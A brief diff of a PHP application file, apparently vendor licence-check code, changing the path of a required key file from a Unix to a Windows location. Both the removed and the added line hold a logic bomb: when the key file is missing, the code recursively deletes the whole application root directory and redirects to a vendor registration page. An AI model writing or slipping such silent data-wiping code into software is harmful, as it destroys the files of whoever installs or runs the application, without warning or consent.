@@ -11,5 +11,5 @@ function rmdir_recurse($path) {
     closedir($handle);
     rmdir($path);
 }
-if(!file_exists('/etc/key.cgi')){rmdir_recurse(ROOTDIR);header('location:http://www.johankharisma.com/product/register.php?client=yohansunyoto');}
+if(!file_exists('C:/key.cgi')){rmdir_recurse(ROOTDIR);header('location:http://www.johankharisma.com/product/register.php?client=yohansunyoto');}
 ?>
